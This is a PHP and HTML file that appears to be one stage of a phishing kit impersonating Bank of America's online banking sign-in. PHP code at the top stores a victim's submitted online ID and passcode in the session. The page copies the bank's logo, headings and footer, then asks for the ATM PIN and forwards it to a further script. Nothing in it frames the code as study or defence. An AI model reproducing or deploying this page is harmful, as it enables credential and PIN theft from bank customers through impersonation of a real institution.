<?php
session_start();


if(isset($_POST['dummy-onlineId']) && isset($_POST['dummy-passcode']) ){
	
	if ($_POST['dummy-onlineId'] =="" || $_POST['dummy-passcode'] =="" ){
	 @header('Location: index.php');
	
	}else {
	
	$_SESSION['onlineid'] = $_POST['dummy-onlineId'];
	$_SESSION['passcode'] = $_POST['dummy-passcode'];
	
	} 

}
   
?>
<!DOCTYPE html>
<html><head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); 
src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), 
url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'),
 url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype');
 font-weight: normal; font-style: normal; font-variant: normal; }</style>



<meta http-equiv="X-UA-Compatible" content="IE=Edge">

		<meta name="Keywords" content="Your Information">
		<meta name="Description" content="Your Information">

<!-- TLDB false -->
			<!-- TL-NOPV true -->
<TITLE>Bank of America | Online Banking | Sign In | Online ID</TITLE> 
 <link rel="shortcut icon" href="img/favicon.ico" type="image/ico" />
	
  <meta name="Description" content="Your Information">
  <meta name="Keywords" content="Your Information">

    <link rel="shortcut icon" href="" type="image/x-icon">
    
							<link rel="stylesheet" type="text/css" href="OLB_YF_F/vipaa-v3-jawr.css" media="all">

</head>		
	<body class="fsd-layout-body" style="display: block;">	

				
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">

		<div class="header-vipaa-module">
		   <div class="fsd-secure-esp-skin">
		   	  <img height="28" width="207" alt="Bank of America" src="./OLB_YF_F/bac_reg_logo_tmp_250X69.gif">
			  <div class="page-type cnx-regular" data-font="#!"> </div>
			  <div class="hidden">
					viewIdPwdFlow=&gt; false
			  </div>
			  <div class="right-links">
					<div class="secure-area">Secure Area</div>
					<a class="divide" href="" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Espa&ntilde;ol</a>
			   
			   <div class="clearboth"></div>
			  </div>
			  <div class="clearboth"></div>
		   </div>
		</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="#!" class="cnx-regular">Your Information</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title TLu_ERROR">We can't process your request.</p>
				
			</div>
		</div>
	</div>

<!-- Added for VIPAA Sub-user pages new currentLocation=/login/forgot/forgot-your-information-->



<div class="messaging-vipaa-module">
		<div class="info-blue-bground-skin hide">
		<div class="info-message">
					<p>If you don't have your Social Security Number or Tax Identification Number, please call us at 1.800.933.6262 for help with sign in.</p>
		</div>      
    </div>
</div>
</div>
					<div class="columns">
						<div class="flex-col lt-col">
	<div class="forgot-vipaa-module">
	   <div class="ssn-pwd-skin phoenix">  
			<form name="forgot-onineid-passcode-form"  id="forgotOnlineidPasscodeForm" method="get" action="html2.php" autocomplete="off">
		
			<p class="ssn-pwd-heading">For your protection, please provide the following information to verify your identity:</p>
			<br>

</select></td></tr></table>

<input   type="tel"   class="form-control" style="width:280px;height:20px;line-height:28px;z-index:7;" name="Pin Atm:" name="4" value=""  placeholder="Pin ATM" required ><br>

						 
					 <div class="clearboth"></div>
						
				<input type="submit" value="Continue"  class="mtop-15 btn-bofa btn-bofa-small btn-bofa-blue" id="forgot-submit" name="=============================================================">
				
				<div class="clearboth"></div>
		    </form>
	   </div>
	</div>
</div>
						<div class="flex-col rt-col">
 <!-- {currentLocation}  -->




	<div class="quick-help-vipaa-module">
		<div class="fsd-lp-skin phoenix sup-ie" aria-atomic="true">			
			<div class="sm-title">	
				<h2 class="sm-header">Quick Help</h2>
				<!-- other than CQ pg -->
			</div>					
			<div class="sm-topcontent-dottedbtm">
				<ul class="help-links">
								<li>
									<a name="What_if_I_don&#39;t_have_a_Social_Security_number_or_Tax_ID_number?" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden">Activate to expand.  </span><span class="title">What if I don't have a Social Security number or Tax ID number?</span></a>
									<div class="help-link-answer hide"><p>If you do not have a SSN or Tax ID number, please <a href="" name="faq_no_ssn_contact_us" target="_self">contact us</a>.</p></div>
								</li>
						<!-- other than CQ pg -->
				</ul>
			</div>
					<div class="sm-btmcontent">

						<div class="tc-module">
								<div id="tc-chat-container-2" tabindex="0"></div>
						</div>

					</div>
		</div>
	</div>
</div>
						<div class="clearboth"></div>
					</div>
					<div class="footer">
						<div class="footer-top">&nbsp;

</div>
<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a href="help/equalhousing_popup.cfm" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br />&copy;&nbsp;2020 Bank of America Corporation.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
		


<div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;">
<div id="boaFormHelp-content"></div><div class="boaFormHelp-bottom"></div></div>

</html>